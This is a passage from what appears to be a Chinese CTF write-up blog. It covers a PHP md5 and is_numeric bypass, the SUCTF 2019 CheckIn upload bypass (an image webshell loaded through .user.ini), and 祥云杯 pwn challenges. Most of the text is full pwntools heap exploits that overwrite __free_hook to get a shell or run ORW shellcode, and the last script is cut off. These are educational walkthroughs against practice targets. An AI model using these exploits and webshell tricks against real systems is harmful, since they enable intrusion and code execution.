class="variable">$id</span>) === md5(<span class="variable">$gg</span>) &amp;&amp; <span class="variable">$id</span> !== <span class="variable">$gg</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;You got the first step&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>])) &#123;</span><br><span class="line">            <span class="variable">$passwd</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>];</span><br><span class="line">            <span class="keyword">if</span> (!is_numeric(<span class="variable">$passwd</span>))</span><br><span class="line">            &#123;</span><br><span class="line">                 <span class="keyword">if</span>(<span class="variable">$passwd</span>==<span class="number">1234567</span>)</span><br><span class="line">                 &#123;</span><br><span class="line">                     <span class="keyword">echo</span> <span class="string">&#x27;Good Job!&#x27;</span>;</span><br><span class="line">                     highlight_file(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">                     <span class="keyword">die</span>(<span class="string">&#x27;By Retr_0&#x27;</span>);</span><br><span class="line">                 &#125;</span><br><span class="line">                 <span class="keyword">else</span></span><br><span class="line">                 &#123;</span><br><span class="line">                     <span class="keyword">echo</span> <span class="string">&quot;can you think twice??&quot;</span>;</span><br><span class="line">                 &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;You can not get it !&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;only one way to get the flag&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;You are not a real hacker!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Please input first&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>首先用数组绕过第一个md5值相等</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ae61c471-4bfb-4699-8e90-cc09b2a018d5.node4.buuoj.cn:81/?gg[]=1&amp;id[]=2</span><br></pre></td></tr></table></figure>

<p>接着用post方式给passwd传参</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">is_numeric — 检测变量是否为数字或数字字符串，如果 是数字和数字字符串则返回 TRUE，否则返回 FALSE。</span><br></pre></td></tr></table></figure>

<p>用1234567a使得返回false，直接得到flag</p>
<h2 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h2><p>一个文件上传，也是将php,phtml等后缀过滤了，首先上传一个图片马，shell.jpg</p>
<p>接着上传一个 <strong>.user.ini</strong> 文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a?</span><br><span class="line">auto_prepend_file=shell.jpg</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># .xxxx.ini　文件是配置当前目录以及当前子目录的规则配置的文件，文件的中的配置会覆盖掉当前php.ini中的规则，是当前用户的配置文件</span><br><span class="line"># 除了主 php.ini 之外，PHP 还会在每个目录下扫描 INI 文件，从被执行的 PHP 文件所在目录开始一直上升到 web 根目录（$_SERVER[&#x27;DOCUMENT_ROOT&#x27;] 所指定的）。如果被执行的 PHP 文件在 web 根目录之外，则只扫描该目录。</span><br><span class="line"></span><br><span class="line"># 如果是 Apache 服务器，则可以利用 .htaccess 文件，作用和 .INI 一样，只是风格上有些不一样</span><br></pre></td></tr></table></figure>

<p>接着蚁剑直接链接，flag在根目录</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://wscyoulin.github.io/2022/11/06/%E7%A5%A5%E4%BA%91%E6%9D%AF%E5%A4%8D%E7%8E%B0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2022/11/06/%E7%A5%A5%E4%BA%91%E6%9D%AF%E5%A4%8D%E7%8E%B0/" class="post-title-link" itemprop="url">祥云杯复现</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>
      

      <time title="Created: 2022-11-06 16:29:43 / Modified: 16:39:39" itemprop="dateCreated datePublished" datetime="2022-11-06T16:29:43+08:00">2022-11-06</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h3 id="unexploitable"><a href="#unexploitable" class="headerlink" title="unexploitable"></a>unexploitable</h3><p>爆破onegadget</p>
<p>exp:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">def pwn(io):</span><br><span class="line">    payload=&#x27;a&#x27;*0x18+&#x27;\xd1&#x27;</span><br><span class="line">    io.send(payload)</span><br><span class="line">    sleep(0.1)</span><br><span class="line">    payload=&#x27;a&#x27;*0x18+&#x27;\x02\x33\x9f&#x27;</span><br><span class="line">    io.send(payload)</span><br><span class="line">    sleep(0.1)</span><br><span class="line"></span><br><span class="line">count=1</span><br><span class="line">while(1):</span><br><span class="line">        io=process(&quot;./unexploitable&quot;)</span><br><span class="line">        pwn(io)</span><br><span class="line">        print(count)</span><br><span class="line">        count += 1</span><br><span class="line">        try:    </span><br><span class="line">                io.recv(timeout=0.2)</span><br><span class="line">                io.recv(timeout=0.2)</span><br><span class="line">        except:</span><br><span class="line">                io.close()</span><br><span class="line">                continue</span><br><span class="line">        break</span><br><span class="line">        </span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p>（具体能不能成功不是很清楚，因为本地把地址随机化关了）</p>
<h3 id="Sandboxheap"><a href="#Sandboxheap" class="headerlink" title="Sandboxheap"></a>Sandboxheap</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from ctypes import *</span><br><span class="line">banary = &quot;./sandboxheap&quot;</span><br><span class="line">elf = ELF(banary)</span><br><span class="line">libc = ELF(&quot;./libc-2.27.so&quot;)</span><br><span class="line">#libc=ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span><br><span class="line">ip = &#x27;1.14.71.254&#x27;</span><br><span class="line">port = 28581</span><br><span class="line">local = 1</span><br><span class="line">if local:</span><br><span class="line">    io = process(banary)</span><br><span class="line">else:</span><br><span class="line">    io = remote(ip, port)</span><br><span class="line"></span><br><span class="line">context(log_level = &#x27;debug&#x27;, os = &#x27;linux&#x27;, arch = &#x27;amd64&#x27;)</span><br><span class="line">#context(log_level = &#x27;debug&#x27;, os = &#x27;linux&#x27;, arch = &#x27;i386&#x27;)</span><br><span class="line"></span><br><span class="line">def dbg():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">s = lambda data : io.send(data)</span><br><span class="line">sl = lambda data : io.sendline(data)</span><br><span class="line">sa = lambda text, data : io.sendafter(text, data)</span><br><span class="line">sla = lambda text, data : io.sendlineafter(text, data)</span><br><span class="line">r = lambda : io.recv()</span><br><span class="line">ru = lambda text : io.recvuntil(text)</span><br><span class="line">uu32 = lambda : u32(io.recvuntil(b&quot;\xff&quot;)[-4:].ljust(4, b&#x27;\x00&#x27;))</span><br><span class="line">uu64 = lambda : u64(io.recvuntil(b&quot;\x7f&quot;)[-6:].ljust(8, b&quot;\x00&quot;))</span><br><span class="line">iuu32 = lambda : int(io.recv(10),16)</span><br><span class="line">iuu64 = lambda : int(io.recv(12),16)</span><br><span class="line">uheap = lambda : u64(io.recv(6).ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">lg = lambda addr : log.info(addr)</span><br><span class="line">ia = lambda : io.interactive()</span><br><span class="line"></span><br><span class="line">def cmd(choice):</span><br><span class="line">    ru(&quot;Your choice: &quot;)</span><br><span class="line">    sl(str(choice))</span><br><span class="line"></span><br><span class="line">def add(index,size):</span><br><span class="line">    cmd(1)</span><br><span class="line">    sla(&quot;Index: &quot;,str(index))</span><br><span class="line">    sla(&quot;Size: &quot;,str(size))</span><br><span class="line"></span><br><span class="line">def edit(index,context,one):</span><br><span class="line">    cmd(2)</span><br><span class="line">    sla(&quot;Index: &quot;,str(index))</span><br><span class="line">    payload=&quot;&quot;</span><br><span class="line">    for i in context:</span><br><span class="line">        t=u8(i)</span><br><span class="line">        for j in range(8):</span><br><span class="line">            if t&amp;1==1:</span><br><span class="line">                payload+=b&#x27;1&#x27;       </span><br><span class="line">            else:</span><br><span class="line">                payload+=b&#x27;0&#x27;</span><br><span class="line">            t=t&gt;&gt;1</span><br><span class="line">    if one:</span><br><span class="line">        payload+=b&#x27;0&#x27;</span><br><span class="line">    sa(&quot;Content: &quot;,payload)</span><br><span class="line"></span><br><span class="line">def show(index):</span><br><span class="line">    cmd(3)</span><br><span class="line">    sla(&quot;Index: &quot;,str(index))</span><br><span class="line"></span><br><span class="line">def delete(index):</span><br><span class="line">    cmd(4)</span><br><span class="line">    sla(&quot;Index: &quot;,str(index))</span><br><span class="line"></span><br><span class="line">def exit():</span><br><span class="line">    cmd(5)</span><br><span class="line"></span><br><span class="line">for i in range(9):</span><br><span class="line">    add(i,0x100)</span><br><span class="line"></span><br><span class="line">for i in range(8):</span><br><span class="line">    delete(i)</span><br><span class="line"></span><br><span class="line">for i in range(7):</span><br><span class="line">    add(i,0x108)</span><br><span class="line"></span><br><span class="line">show(0)</span><br><span class="line">ru(&quot;Content: &quot;)</span><br><span class="line">heapbase=u64(io.recv(6).ljust(8,b&#x27;\x00&#x27;))-0x7b0</span><br><span class="line">print(&quot;heapbase:&quot;+hex(heapbase))</span><br><span class="line"></span><br><span class="line">add(7,0x20)</span><br><span class="line">show(7)</span><br><span class="line">ru(&quot;Content: &quot;)</span><br><span class="line">libcbase=uu64()-0x3ebda0</span><br><span class="line">print(&quot;libcbase:&quot;+hex(libcbase))</span><br><span class="line">system=libcbase+libc.sym[&#x27;system&#x27;]</span><br><span class="line">free_hook=libcbase+libc.sym[&#x27;__free_hook&#x27;]</span><br><span class="line">setcontext=libcbase+libc.sym[&#x27;setcontext&#x27;]+53</span><br><span class="line">mprotect=libcbase+libc.sym[&#x27;mprotect&#x27;]</span><br><span class="line"></span><br><span class="line">add(9,0xd0)</span><br><span class="line">add(10,0x100)</span><br><span class="line">add(11,0x68)</span><br><span class="line">add(12,0x100)</span><br><span class="line">add(13,0x50)</span><br><span class="line">add(14,0x68)</span><br><span class="line"></span><br><span class="line">for i in range(7):</span><br><span class="line">    delete(i)</span><br><span class="line"></span><br><span class="line">delete(10)</span><br><span class="line">payload=b&#x27;A&#x27;*0x60+p64(0x1c0-0x40)</span><br><span class="line">edit(11,payload,1)</span><br><span class="line">io.sendline()</span><br><span class="line"></span><br><span class="line">delete(12)</span><br><span class="line">delete(14)</span><br><span class="line">delete(11)</span><br><span class="line"></span><br><span class="line">add(10,0xf0)</span><br><span class="line">add(11,0xf0)</span><br><span class="line">edit(11,p64(0)+p64(0x71)+p64(free_hook),0)</span><br><span class="line">io.sendline()</span><br><span class="line"></span><br><span class="line">add(12,0x68)</span><br><span class="line">add(14,0x68)</span><br><span class="line">payload=p64(setcontext)</span><br><span class="line">edit(14,payload,0)</span><br><span class="line">io.sendline()</span><br><span class="line"></span><br><span class="line">add(0,0x60)</span><br><span class="line">add(2,0x50)</span><br><span class="line">add(1,0xa0)</span><br><span class="line">add(3,0xb0)</span><br><span class="line">payload=p64(0)+p64(heapbase+0x1000)+p64(0x1000)+p64(0)*2+p64(7)+p64(0)+p64(mprotect)+p64(heapbase+0x1000)+p64(mprotect)+p64(heapbase+0x1060)</span><br><span class="line">edit(1,payload,0)</span><br><span class="line">io.sendline()</span><br><span class="line"></span><br><span class="line">shellcode=&#x27;&#x27;&#x27;</span><br><span class="line">   mov rdi,0;</span><br><span class="line">   mov rdx,0;</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">shellcode+=&#x27;int 3&#x27;+shellcraft.open(&#x27;flag&#x27;)</span><br><span class="line">shellcode+=shellcraft.read(3,&#x27;rsp&#x27;,64)</span><br><span class="line">shellcode+=shellcraft.write(1,&#x27;rsp&#x27;,64)</span><br><span class="line">#shellcode=&#x27;int 3 &#x27;+shellcraft.sh()</span><br><span class="line">shellcode=asm(shellcode)</span><br><span class="line">edit(3,shellcode,1)</span><br><span class="line">io.sendline()</span><br><span class="line">cmd(4)</span><br><span class="line">gdb.attach(io)</span><br><span class="line">pause()</span><br><span class="line">sla(&quot;Index: &quot;,str(2))</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">ia()</span><br></pre></td></tr></table></figure>

<p>本地不知道啥原因打orw不出flag，非得动调进去一步一步走完shellcode才可以出flag，猜测远程应该没这个问题</p>
<h3 id="bitheap"><a href="#bitheap" class="headerlink" title="bitheap"></a>bitheap</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from ctypes import *</span><br><span class="line">banary = &quot;./bitheap&quot;</span><br><span class="line">elf = ELF(banary)</span><br><span class="line">libc = ELF(&quot;./libc-2.27.so&quot;)</span><br><span class="line">#libc=ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span><br><span class="line">ip = &#x27;1.14.71.254&#x27;</span><br><span class="line">port = 28581</span><br><span class="line">local = 1</span><br><span class="line">if local:</span><br><span class="line">    io = process(banary)</span><br><span class="line">else:</span><br><span class="line">    io = remote(ip, port)</span><br><span class="line"></span><br><span class="line">context(log_level = &#x27;debug&#x27;, os = &#x27;linux&#x27;, arch = &#x27;amd64&#x27;)</span><br><span class="line">#context(log_level = &#x27;debug&#x27;, os = &#x27;linux&#x27;, arch = &#x27;i386&#x27;)</span><br><span class="line"></span><br><span class="line">def dbg():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">s = lambda data : io.send(data)</span><br><span class="line">sl = lambda data : io.sendline(data)</span><br><span class="line">sa = lambda text, data : io.sendafter(text, data)</span><br><span class="line">sla = lambda text, data : io.sendlineafter(text, data)</span><br><span class="line">r = lambda : io.recv()</span><br><span class="line">ru = lambda text : io.recvuntil(text)</span><br><span class="line">uu32 = lambda : u32(io.recvuntil(b&quot;\xff&quot;)[-4:].ljust(4, b&#x27;\x00&#x27;))</span><br><span class="line">uu64 = lambda : u64(io.recvuntil(b&quot;\x7f&quot;)[-6:].ljust(8, b&quot;\x00&quot;))</span><br><span class="line">iuu32 = lambda : int(io.recv(10),16)</span><br><span class="line">iuu64 = lambda : int(io.recv(12),16)</span><br><span class="line">uheap = lambda : u64(io.recv(6).ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">lg = lambda addr : log.info(addr)</span><br><span class="line">ia = lambda : io.interactive()</span><br><span class="line"></span><br><span class="line">def cmd(choice):</span><br><span class="line">    ru(&quot;Your choice: &quot;)</span><br><span class="line">    sl(str(choice))</span><br><span class="line"></span><br><span class="line">def add(index,size):</span><br><span class="line">    cmd(1)</span><br><span class="line">    sla(&quot;Index: &quot;,str(index))</span><br><span class="line">    sla(&quot;Size: &quot;,str(size))</span><br><span class="line"></span><br><span class="line">def edit(index,context,one):</span><br><span class="line">    cmd(2)</span><br><span class="line">    sla(&quot;Index: &quot;,str(index))</span><br><span class="line">    payload=&quot;&quot;</span><br><span class="line">    for i in context:</span><br><span class="line">        t=u8(i)</span><br><span class="line">        for j in range(8):</span><br><span class="line">            if t&amp;1==1:</span><br><span class="line">                payload+=b&#x27;1&#x27;       </span><br><span class="line">            else:</span><br><span class="line">                payload+=b&#x27;0&#x27;</span><br><span class="line">            t=t&gt;&gt;1</span><br><span class="line">    if one:</span><br><span class="line">        payload+=b&#x27;0&#x27;</span><br><span class="line">    sa(&quot;Content: &quot;,payload)</span><br><span class="line"></span><br><span class="line">def show(index):</span><br><span class="line">    cmd(3)</span><br><span class="line">    sla(&quot;Index: &quot;,str(index))</span><br><span class="line"></span><br><span class="line">def delete(index):</span><br><span class="line">    cmd(4)</span><br><span class="line">    sla(&quot;Index: &quot;,str(index))</span><br><span class="line"></span><br><span class="line">def exit():</span><br><span class="line">    cmd(5)</span><br><span class="line"></span><br><span class="line">for i in range(9):</span><br><span class="line">    add(i,0x100)</span><br><span class="line"></span><br><span class="line">for i in range(8):</span><br><span class="line">    delete(i)</span><br><span class="line"></span><br><span class="line">for i in range(7):</span><br><span class="line">    add(i,0x108)</span><br><span class="line"></span><br><span class="line">show(0)</span><br><span class="line">ru(&quot;Content: &quot;)</span><br><span class="line">heapbase=u64(io.recv(6).ljust(8,b&#x27;\x00&#x27;))-0x7b0</span><br><span class="line">print(&quot;heapbase:&quot;+hex(heapbase))</span><br><span class="line"></span><br><span class="line">add(7,0x20)</span><br><span class="line">show(7)</span><br><span class="line">ru(&quot;Content: &quot;)</span><br><span class="line">libcbase=uu64()-0x3ebda0</span><br><span class="line">print(&quot;libcbase:&quot;+hex(libcbase))</span><br><span class="line">system=libcbase+libc.sym[&#x27;system&#x27;]</span><br><span class="line">free_hook=libcbase+libc.sym[&#x27;__free_hook&#x27;]</span><br><span class="line">setcontext=libcbase+libc.sym[&#x27;setcontext&#x27;]+53</span><br><span class="line">mprotect=libcbase+libc.sym[&#x27;mprotect&#x27;]</span><br><span class="line"></span><br><span class="line">add(9,0xd0)</span><br><span class="line">add(10,0x100)</span><br><span class="line">add(11,0x68)</span><br><span class="line">add(12,0x100)</span><br><span class="line">add(13,0x50)</span><br><span class="line">add(14,0x68)</span><br><span class="line"></span><br><span class="line">for i in range(7):</span><br><span class="line">    delete(i)</span><br><span class="line"></span><br><span class="line">delete(10)</span><br><span class="line">payload=b&#x27;A&#x27;*0x60+p64(0x1c0-0x40)</span><br><span class="line">edit(11,payload,1)</span><br><span class="line">io.sendline()</span><br><span class="line"></span><br><span class="line">delete(12)</span><br><span class="line">delete(14)</span><br><span class="line">delete(11)</span><br><span class="line"></span><br><span class="line">add(10,0xf0)</span><br><span class="line">add(11,0xf0)</span><br><span class="line">edit(11,p64(0)+p64(0x71)+p64(free_hook),0)</span><br><span class="line">io.sendline()</span><br><span class="line"></span><br><span class="line">add(12,0x68)</span><br><span class="line">add(14,0x68)</span><br><span class="line">payload=p64(system)</span><br><span class="line">edit(14,payload,0)</span><br><span class="line">io.sendline()</span><br><span class="line"></span><br><span class="line">add(15,0x110)</span><br><span class="line">edit(15,b&#x27;/bin/sh\x00&#x27;,0)</span><br><span class="line">delete(15)</span><br><span class="line"></span><br><span class="line">ia()</span><br></pre></td></tr></table></figure>

<p>就是一个简单的打free_hook，用sandbox一样的脚本也可以打通</p>
<h1 id="leak"><a href="#leak" class="headerlink" title="leak"></a>leak</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from ctypes import *</span><br><span class="line">banary = &quot;./leak&quot;</span><br><span class="line">elf = ELF(banary)</span><br><span class="line">libc = ELF(&quot;./libc-2.27.so&quot;)</span><br><span class="line">#libc=ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span><br><span class="line">ip = &#x27;1.14.71.254&#x27;</span><br><span class="line">port = 28581</span><br><span class="line">local = 1</span><br><span class="line">if local:</span><br><span class="line">    io = process(banary)</span><br><span class="line">else:</span><br><span class="line">    io = remote(ip, port)</span><br><span class="line"></span><br><span class="line">context(log_level = &#x27;debug&#x27;, os = 